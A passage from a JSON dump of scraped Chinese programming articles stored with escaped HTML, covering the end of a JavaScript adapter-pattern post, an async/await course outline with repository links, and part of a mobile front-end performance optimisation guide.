class=\"heading\"\u003e适配器模式的优点\u003c/h3\u003e\u003cul\u003e\n\u003cli\u003e通过适配的方式,可以很好的解决原本存在的兼容性问题\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e适配器模式总结\u003c/h3\u003e\u003cp\u003e在需要把对象进行转换,解决一些兼容性问题的时候,我们可以考虑用适配器的思路去解决问题\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e注意\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://github.com/ToNiQian/js-design-mode\"\u003eJavaScript设计模式系列github地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e深入系列文章部分是有先后顺序的，按照目录结构顺序阅读效果最好。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e关于设计模式,更多的是结合我自己的一些理解,把他总结出来分享给大家,如果大家发现有什么不正确的地方,\u003ccode\u003e希望大家一定得提出来\u003c/code\u003e,避免我这边误人子弟,感谢大家!!!\u003c/h3\u003e","buildTime":"1513597498.8588","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0701"},"id":"5a04f36d6fb9a045293636e0","author":{"$oid":"5a4b770f19da8721f49c06fd"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"玩转异步 JS ：async/await 简明教程（附视频下载）","meta":{"likeCount":0},"tag":["Node.js","JavaScript","前端","ECMAScript 6","Visual Studio Code","iTerm"],"comment":[],"shortContent":"在软件开发领域，简洁的代码 =\u003e 容易阅读的代码 =\u003e 容易维护的代码，而 ES2017 中的 async/await 特性能让我们编写出相比回调地狱和 Promise 链式调用更直观、更容易理解的代码，await 关键字接收一个 Promise，等待代码执行，直到 Promi…","content":"\u003ch2 class=\"heading\"\u003e课程介绍\u003c/h2\u003e\u003cp\u003e在软件开发领域，简洁的代码 =\u0026gt; 容易阅读的代码 =\u0026gt; 容易维护的代码，而 ES2017 中的 async/await 特性能让我们编写出相比回调地狱和 Promise 链式调用更直观、更容易理解的代码，await 关键字接收一个 Promise，等待代码执行，直到 Promise 状态变为 resolved 或者 rejected，这种特性能让我们的异步代码阅读起来更像是同步代码。\u003c/p\u003e\n\u003cp\u003e本课程共 8 小节 20 分钟，将会从编写简单的 async/await 函数开始，用实例带领大家探索 async/await 实战的方方面面，比如如何结合 Promise 和 await 关键字？如何定义不同类型的 async 函数？如何安全的使用 async/await，即处理错误？如何让多个 await 串行或并行？如何在循环中正确使用 await？\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e适用人群\u003c/h2\u003e\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e[required] 具备 JS 基础知识，知道如何运行 Node.js 脚本；\u003c/li\u003e\n\u003cli\u003e[required] 知道 Callback、Promise 等异步处理概念；\u003c/li\u003e\n\u003cli\u003e[optional] 期望学习新的异步特性，编写更简洁易懂易维护的代码；\u003c/li\u003e\n\u003cli\u003e[optional] 期望不断打磨自己的 JS 技能，让自己变得更值钱；\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e内容目录\u003c/h2\u003e\u003ch3 class=\"heading\"\u003e1. 编写第一个 async/await 函数\u003c/h3\u003e\u003cp\u003e手把手教你把发起 HTTP 请求并解析响应的代码改写成 async/await 风格，让你学会 async/await 的基本语法。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2. 将 async 函数用在 Promise 链中\u003c/h3\u003e\u003cp\u003e带你探索如何在 Promise 链中像使用其他 Promise 一样无缝使用 async 函数。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e3. 把任意类型的函数转成 async 风格\u003c/h3\u003e\u003cp\u003e实例演示如何将任意函数写成 async 风格，包括函数声明、函数表达式、箭头函数、类方法、对象方法等。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e4. 处理 async 函数中的错误\u003c/h3\u003e\u003cp\u003e不同于 Promise 中的 .catch() 错误处理机制，在 async 函数中，我们需要使用 try/catch 结构来恰当的处理错误。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e5. 正确处理多个 await 操作的并行串行\u003c/h3\u003e\u003cp\u003e学会通过移动 await 关键词的位置实现多个 await 操作串行或者并行，并且用数据证明让多个异步操作并行的性能优势。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e6. 使用 Promise.all() 让多个 await 操作并行\u003c/h3\u003e\u003cp\u003e学会使用 ES2015 中的解构和 Promise.all() 实现多个异步操作的并行，非常适合需要同时发起多个请求的情形，代码可读性不打折扣。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e7. 结合 await 和任意兼容 .then() 的代码\u003c/h3\u003e\u003cp\u003eawait 操作符并不仅仅局限于 ES2015 的 Promise，可以和任意兼容 .then() 方法的代码使用，通过实例学会如何与流行的 Promise 库结合使用。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e8. 在 for 循环中正确的使用 await\u003c/h3\u003e\u003cp\u003e理解 for 循环中 await 不同写法带来的性能影响，以及改进的方法。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e源码链接\u003c/h2\u003e\u003cp\u003e代码仓库：\u003ca href=\"https://github.com/wangshijun/course-javascript-async-await\"\u003ewangshijun/course-javascript-async-await\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e运行方法（请确保系统中安装了 \u003ca href=\"https://nodejs.org/en/\"\u003eNode.js\u003c/a\u003e）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs shell\" lang=\"shell\"\u003egit clone https://github.com/wangshijun/course-javascript-async-await.git\ncd course-javascript-async-await\nnode xxx.js\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的 xxx.js 对应每节课程的源码，列表如下：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wangshijun/course-javascript-async-await/blob/master/01-first-async-await-function.js\"\u003e编写第一个 async/await 函数\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wangshijun/course-javascript-async-await/blob/master/02-use-async-function-as-promise.js\"\u003e将 async 函数用在 Promise chain 中\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wangshijun/course-javascript-async-await/blob/master/03-convert-any-function-into-async.js\"\u003e把任意类型的函数转成 async 风格\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wangshijun/course-javascript-async-await/blob/master/04-handling-errors-for-async.js\"\u003e处理 async 函数中的错误\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wangshijun/course-javascript-async-await/blob/master/05-await-multiple-promise-seq-or-concurrently.js\"\u003e正确处理多个 await 操作的并行串行\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wangshijun/course-javascript-async-await/blob/master/06-await-multiple-promise-with-all.js\"\u003e使用 Promise.all() 让多个 await 操作并行\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wangshijun/course-javascript-async-await/blob/master/07-use-await-with-any-thenable.js\"\u003e结合 await 和任意兼容 .then() 的代码\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/wangshijun/course-javascript-async-await/blob/master/08-await-in-loops.js\"\u003e在 for 循环中正确的使用 await\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e运行环境\u003c/h2\u003e\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003eNode.js v8.6.0\u003c/li\u003e\n\u003cli\u003eVSCode v1.17.1 + Vim\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e参考资料\u003c/h2\u003e\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://developers.google.com/web/fundamentals/getting-started/primers/async-functions\"\u003eGoogle Web Fundamentals\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e视频下载\u003c/h2\u003e\u003cp\u003e关注《前端周刊》微信公众号，回复 course-async-await 即可获取高清视频教程下载地址。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/11/10/b48f32d68bb07abf3f3b383d6c3a0680\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e题外话\u003c/h2\u003e\u003cp\u003e最后，可能你有同学会问，我为什么要做这个公开课？接下来的计划是什么？请阅读\u003ca href=\"https://juejin.im/post/59eb06a85188255fd93bf391\"\u003e好久不见，我总感觉欠你点什么\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514887887.92","__v":0}
{"_id":{"$oid":"5a4b76db2239bd131cd79f49"},"id":"5a45d8e2f265da431e1715b9","author":{"$oid":"5a4b76d92239bd131cd79f2f"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"前端性能优化之移动端浏览器优化策略","meta":{"likeCount":0},"tag":["前端","浏览器","JavaScript","SVG"],"comment":[],"shortContent":"为了进一步提升页面加载速度，可以考虑将页面的数据请求尽可能提前，避免在 JavaScript 加载完成后才去请求数据。通常数据请求是页面内容渲染中关键路径最长的部分，而且不能并行，所以如果能将数据请求提前，可以极大程度上缩短页面内容的渲染完成时间。那怎么将请求数据提前呢？建议采…","content":"\u003cblockquote\u003e\n\u003cp\u003e上篇文章介绍了\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a43343bf265da432f316441\"\u003e桌面浏览器的优化策略\u003c/a\u003e,相对于桌面浏览器，移动端 \u003cstrong\u003eWeb\u003c/strong\u003e 浏览器上有一些较为明显的特点：设备屏幕小、新特性兼容性比较好、支持一些较新的 \u003cstrong\u003eHTML5\u003c/strong\u003e 和 \u003cstrong\u003eCSS3\u003c/strong\u003e 特性、需要与 \u003cstrong\u003enative\u003c/strong\u003e 应用交互等。但移动端浏览器可用的 \u003cstrong\u003eCPU\u003c/strong\u003e 计算资源和网络资源极为有限，因此要做好移动端 \u003cstrong\u003eWeb\u003c/strong\u003e 上的优化往往需要做更多的事情。首先，在移动端 \u003cstrong\u003eWeb\u003c/strong\u003e 的前端页面渲染中，桌面浏览器上的优化规则同样适用，此外针对移动端也要做一些极致的优化来达到更好的效果。需要注意的是，并不是移动端的优化原则在桌面浏览器端就不适用，而是由于兼容性和差异性的原因，一些优化原则在移动端更具代表性。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e网络加载类\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e1.首屏数据请求提前，避免 \u003cstrong\u003eJavaScript\u003c/strong\u003e 文件加载后才请求数据\u003c/h4\u003e\n\u003cp\u003e为了进一步提升页面加载速度，可以考虑将页面的数据请求尽可能提前，避免在 \u003cstrong\u003eJavaScript\u003c/strong\u003e 加载完成后才去请求数据。通常数据请求是页面内容渲染中关键路径最长的部分，而且不能并行，所以如果能将数据请求提前，可以极大程度上缩短页面内容的渲染完成时间。那怎么将请求数据提前呢？建议采用首屏数据渐进式预加载的优化思路，具体如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e1.优化首屏数据加载节点的速度。\n\n2.预先加载首屏数据，使得多个串行节点并行化。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e接下来详细介绍优化步骤，第1点会在第一步优化中体现，但核心思路和主要优化收益更多体现在第2点：多个串行节点并行化。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStep1：资源文件下载与首屏数据请求节点并行\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e为了达到资源下载与数据请求并行的效果，我们充分利用了 \u003cstrong\u003eHTTP Chunk\u003c/strong\u003e 传输与浏览器的渐进式渲染特性：\u003c/p\u003e\n\u003cp\u003e将入口页分为静态片段和数据片段：静态片段包含了各个资源标签 \u003ccode\u003e（script,link）\u003c/code\u003e，静态的导航栏，加载指示器等；数据片段则是包含首屏数据的内联脚本，大至如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;script\u0026gt;window.__APP_DATA__ = { /* 相关的首屏数据 */ };\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e浏览器请求入口页时，入口页服务器 \u003cstrong\u003e并行\u003c/strong\u003e 做以下操作：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eHTTP Chunk 方式输出静态片段\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e请求首屏数据并在所有数据请求完成后将数据片段和应用初始化代码返回给浏览器。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003e注：http chunk 方式输出在 NodeJS 中及其容易满足，简单的 res.write(chunk) 即可。\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStep2：应用初始化，资源文件下载，首屏数据请求节点并行\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e在 \u003cstrong\u003eStep1\u003c/strong\u003e 的基础上继续分析，应用初始化节点耗时也很明显，同时该节点要进行必须等待资源文件下载完毕，但理论上可以不依赖我们的首屏数据，还是可以让其和首屏数据请求并行。这里我们无法在 \u003cstrong\u003eStep1\u003c/strong\u003e 方案上直接将应用初始化和数据请求并行化，主要原因在于当首屏数据请求时间大于资源加载+应用初始化完成时间时，应用会在没有数据的情况下进入首屏渲染节点，从而导致异常。\u003c/p\u003e\n\u003cp\u003e解决方案是将数据片段的输出变成 promise 片段：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003epending promise\u003c/code\u003e 片段，与静态片段一起输出，大概如下：\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;script\u0026gt;\nwindow.__APP_DATA__ = {\n RESOLVERS: {}\n userInfo: new Promise((resolve, reject) =\u0026gt; {\n   // 超时认为失败\n   \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e timer = \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(reject.bind(null, {message: \u003cspan class=\"hljs-string\"\u003e'timeout'\u003c/span\u003e}), 12000);\n   window.__APP_DATA__.userInfo = (err, data) =\u0026gt; {\n     clearTimeout(timer);\n     err ? reject(err) : resolve(data)\n   }\n })\n};\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"2\"\u003e\n\u003cli\u003e\u003ccode\u003eresolve promise\u003c/code\u003e 片段，该片段在数据请求成功返回后输出，大概如下：\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;script\u0026gt;window.__APP_DATA__.RESOLVERS.userInfo(null, data); \u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"3\"\u003e\n\u003cli\u003e\u003ccode\u003ereject promise\u003c/code\u003e 片段，该片段在数据请求失败后输出，大概如下：\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;script\u0026gt;window.__APP_DATA__.RESOLVERS.userInfo(error); \u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e2．首屏加载和按需加载，非首屏内容滚屏加载，保证首屏内容最小化\u003c/h4\u003e\n\u003cp\u003e由于移动端网络速度相对较慢，网络资源有限，因此为了尽快完成页面内容的加载，需要保证首屏加载资源最小化，非首屏内容使用滚动的方式异步加载。一般推荐移动端页面首屏数据展示延时最长不超过 \u003cstrong\u003e3\u003c/strong\u003e 秒。目前中国联通 \u003cstrong\u003e3G\u003c/strong\u003e 的网络速度为 \u003cstrong\u003e338KB/s（2.71Mb/s）\u003c/strong\u003e，所以推荐首屏所有资源大小不超过 \u003cstrong\u003e1014KB\u003c/strong\u003e，即大约不超过 \u003cstrong\u003e1MB\u003c/strong\u003e。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e3.模块化资源并行下载\u003c/h4\u003e\n\u003cp\u003e在移动端资源加载中，尽量保证 \u003cstrong\u003eJavaScript\u003c/strong\u003e 资源并行加载，主要指的是模块化 \u003cstrong\u003eJavaScript\u003c/strong\u003e 资源的异步加载，例如 \u003cstrong\u003eAMD\u003c/strong\u003e 的异步模块，使用并行的加载方式能够缩短多个文件资源的加载时间。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e4．inline 首屏必备的 CSS 和 JavaScript\u003c/h4\u003e\n\u003cp\u003e通常为了在 HTML 加载完成时能使浏览器中有基本的样式，需要将页面渲染时必备的 \u003cstrong\u003eCSS\u003c/strong\u003e 和 \u003cstrong\u003eJavaScript\u003c/strong\u003e 通过 \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e 或 \u003ccode\u003e\u0026lt;style\u0026gt;\u003c/code\u003e 内联到页面中，避免页面 HTML 载入完成到页面内容展示这段过程中页面出现空白。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html lang=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\n   \u0026lt;head\u0026gt;\n   \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n   \u0026lt;title\u0026gt;样例\u0026lt;/title\u0026gt;\n   \u0026lt;meta name=\u003cspan class=\"hljs-string\"\u003e\"viewport\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\"\u003c/span\u003e\u0026gt;\n   \u0026lt;style\u0026gt;\n   /*必备的首屏CSS*/\n   html,body{\n        margin:0;\n        padding:0;\n        background-color:\u003cspan class=\"hljs-comment\"\u003e#eee;\u003c/span\u003e\n    }\n    \u0026lt;/style\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e5. meta dns prefetch 设置 DNS 预解析\u003c/h4\u003e\n\u003cp\u003e设置文件资源的 \u003cstrong\u003eDNS\u003c/strong\u003e 预解析，让浏览器提前解析获取静态资源的主机 \u003cstrong\u003eIP\u003c/strong\u003e，避免等到请求时才发起 \u003cstrong\u003eDNS\u003c/strong\u003e 解析请求。通常在移动端 \u003cstrong\u003eHTML\u003c/strong\u003e 中可以采用如下方式完成。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!--cdn域名预解析--\u0026gt;\n\u0026lt;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"x-dns-prefetch-control\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"on\"\u003c/span\u003e \u0026gt;\n\u0026lt;link rel=\u003cspan class=\"hljs-string\"\u003e\"dns-prefetch\"\u003c/span\u003e href=\u003cspan class=\"hljs-string\"\u003e\"//cdn.domain.com\"\u003c/span\u003e \u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e6.资源预加载\u003c/h4\u003e\n\u003cp\u003e对于移动端首屏加载后可能会被使用的资源，需要在首屏完成加载后尽快进行加载，保证在用户需要浏览时已经加载完成，这时候如果再去异步请求就显得很慢。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e7．合理利用 MTU 策略\u003c/h4\u003e\n\u003cp\u003e通常情况下，我们认为 \u003cstrong\u003eTCP\u003c/strong\u003e 网络传输的最大传输单元 \u003ccode\u003e（Maximum Transmission Unit，MTU）\u003c/code\u003e为 \u003cstrong\u003e1500B\u003c/strong\u003e，即一个 \u003cstrong\u003eRTT\u003c/strong\u003e（\u003ccode\u003eRound-Trip Time\u003c/code\u003e，网络请求往返时间）内可以传输的数据量最大为 \u003cstrong\u003e1500\u003c/strong\u003e 字节。因此，在前后端分离的开发模式中，尽量保证页面的 \u003cstrong\u003eHTML\u003c/strong\u003e 内容在 \u003cstrong\u003e1KB\u003c/strong\u003e 以内，这样整个 \u003cstrong\u003eHTML\u003c/strong\u003e 的内容请求就可以在一个 \u003cstrong\u003eRTT\u003c/strong\u003e 内请求完成，最大限度地提高 \u003cstrong\u003eHTML\u003c/strong\u003e 载入速度。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e缓存类\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e1．合理利用浏览器缓存\u003c/h4\u003e\n\u003cp\u003e除了之前说到的使用 \u003cstrong\u003eCache-Control\u003c/strong\u003e、\u003cstrong\u003eExpires\u003c/strong\u003e、\u003cstrong\u003eEtag\u003c/strong\u003e 和 \u003cstrong\u003eLast-Modified\u003c/strong\u003e 来设置 \u003cstrong\u003eHTTP\u003c/strong\u003e 缓存外，在移动端还可以使用 \u003cstrong\u003elocalStorage\u003c/strong\u003e 等来保存 \u003cstrong\u003eAJAX\u003c/strong\u003e 返回的数据，或者使用 \u003cstrong\u003elocalStorage\u003c/strong\u003e 保存 \u003cstrong\u003eCSS\u003c/strong\u003e 或 \u003cstrong\u003eJavaScript\u003c/strong\u003e 静态资源内容，实现移动端的离线应用，尽可能减少网络请求，保证静态资源内容的快速加载。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e2．静态资源离线方案\u003c/h4\u003e\n\u003cp\u003e对于移动端或 \u003cstrong\u003eHybrid\u003c/strong\u003e 应用，可以设置离线文件或离线包机制让静态资源请求从本地读取，加快资源载入速度，并实现离线更新。关于这块内容，我们会在后面的章节中重点讲解。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e3．尝试使用 AMP HTML\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eAMP HTML\u003c/strong\u003e 可以作为优化前端页面性能的一个解决方案，使用 \u003cstrong\u003eAMP Component\u003c/strong\u003e 中的元素来代替原始的页面元素进行直接渲染。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!--不推荐--\u0026gt;\n\u0026lt;video width=\u003cspan class=\"hljs-string\"\u003e\"400\"\u003c/span\u003e height=\u003cspan class=\"hljs-string\"\u003e\"300\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"http://www.domain.com/videos/myvideo.mp4\"\u003c/span\u003e poster=\u003cspan class=\"hljs-string\"\u003e\"path/poster.jpg\"\u003c/span\u003e\u0026gt;\n   \u0026lt;div fallback\u0026gt;\n        \u0026lt;p\u0026gt;Your browser doesn’t support HTML5 video\u0026lt;/p\u0026gt;\n    \u0026lt;/div\u0026gt;\n    \u0026lt;\u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"video/mp4\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"foo.mp4\"\u003c/span\u003e\u0026gt;\n    \u0026lt;\u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"video/webm\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"foo.webm\"\u003c/span\u003e\u0026gt;\n\u0026lt;/video\u0026gt;\n\n\u0026lt;!--推荐--\u0026gt;\n\u0026lt;amp-video width=\u003cspan class=\"hljs-string\"\u003e\"400\"\u003c/span\u003e height=\u003cspan class=\"hljs-string\"\u003e\"300\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"http://www.domain.com/videos/myvideo.mp4\"\u003c/span\u003e\nposter=\u003cspan class=\"hljs-string\"\u003e\"path/poster.jpg\"\u003c/span\u003e\u0026gt;\n   \u0026lt;div fallback\u0026gt;\n       \u0026lt;p\u0026gt;Your browser doesn’t support HTML5 video\u0026lt;/p\u0026gt;\n   \u0026lt;/div\u0026gt;\n   \u0026lt;\u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"video/mp4\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"foo.mp4\"\u003c/span\u003e\u0026gt;\n   \u0026lt;\u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"video/webm\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"foo.webm\"\u003c/span\u003e\u0026gt;\n\u0026lt;/amp-video\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e4．尝试使用 PWA 模式\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003ePWA\u003c/strong\u003e（\u003cstrong\u003eProgressive Web Apps\u003c/strong\u003e）是 \u003cstrong\u003eGoogle\u003c/strong\u003e 提出的用前沿的 \u003cstrong\u003eWeb\u003c/strong\u003e 技术为网页提供 \u003cstrong\u003eApp\u003c/strong\u003e 使用体验的一系列方案。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e图片类\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e1．图片压缩处理\u003c/h4\u003e\n\u003cp\u003e在移动端，通常要保证页面中一切用到的图片都是经过压缩优化处理的，而不是以原图的形式直接使用的，因为那样很消耗流量，而且加载时间更长。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e2．使用较小的图片，合理使用 base64 内嵌图片\u003c/h4\u003e\n\u003cp\u003e在页面使用的背景图片不多且较小的情况下，可以将图片转化成 \u003ccode\u003ebase64\u003c/code\u003e 编码嵌入到 \u003ccode\u003eHTML\u003c/code\u003e 页面或 \u003ccode\u003eCSS\u003c/code\u003e 文件中，这样可以减少页面的 \u003cstrong\u003eHTTP\u003c/strong\u003e 请求数。需要注意的是，要保证图片较小，一般图片大小超过 \u003cstrong\u003e2KB\u003c/strong\u003e 就不推荐使用 \u003cstrong\u003ebase64\u003c/strong\u003e 嵌入显示了。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e.class-name{\n   background-image : url(\u003cspan class=\"hljs-string\"\u003e'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAALCAMAAABxsOwqAAAAYFBMVEWnxwusyQukxQudwQyZvgyhxAyfwgyxzAsUHQGOuA0aJAERGAFIXwSTugyEqgtqhghQZgUwQQIpOQKbuguVtQuKrAuCowp2kQlheghTbQZHWQU7SwVAVgQ6TgQlLwMeKwFOemyQAAAAVElEQVQI1y3JVRaAIAAF0UconXbvf5ei8HfPDIQQhBAAFE10iKig3SLRNN4SP/p+N08VC0YnfIlNWtqIkhg/TPYbCvhqdHAWRXPZSp3g3CWZvVLXC6OJA3ukv0AaAAAAAElFTkSuQmCC'\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e3．使用更高压缩比格式的图片\u003c/h4\u003e\n\u003cp\u003e使用具有较高压缩比格式的图片，如 \u003cstrong\u003ewebp\u003c/strong\u003e（需要设计降级兼容方案）等。在同等图片画质的情况下，高压缩比格式的图片体积更小，能够更快完成文件传输，节省网络流量。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;img src=\u003cspan class=\"hljs-string\"\u003e\"https://user-gold-cdn.xitu.io/2017/12/29/160a1604ef450396\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"webp格式图片\"\u003c/span\u003e \u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e4．图片懒加载\u003c/h4\u003e\n\u003cp\u003e为了保证页面内容的最小化，加速页面的渲染，尽可能节省移动端网络流量，页面中的图片资源推荐使用懒加载实现，在页面滚动时动态载入图片。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;img data-src=\u003cspan class=\"hljs-string\"\u003e\"https://user-gold-cdn.xitu.io/2017/12/29/160a1604f3efd980\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"懒加载图片\"\u003c/span\u003e \u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e5．使用 \u003cstrong\u003eMediaQuery\u003c/strong\u003e 或 \u003cstrong\u003esrcset\u003c/strong\u003e 根据不同屏幕加载不同大小图片\u003c/p\u003e\n\u003cp\u003e在介绍响应式的章节中我们了解到，针对不同的移动端屏幕尺寸和分辨率，输出不同大小的图片或背景图能保证在用户体验不降低的前提下节省网络流量，加快部分机型的图片加载速度，这在移动端非常值得推荐。\u003c/p\u003e\n\u003cp\u003e6．使用 \u003cstrong\u003eiconfont\u003c/strong\u003e 代替图片图标\u003c/p\u003e\n\u003cp\u003e在页面中尽可能使用 \u003cstrong\u003eiconfont\u003c/strong\u003e 来代替图片图标，这样做的好处有以下几个：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e使用 \u003cstrong\u003eiconfont\u003c/strong\u003e 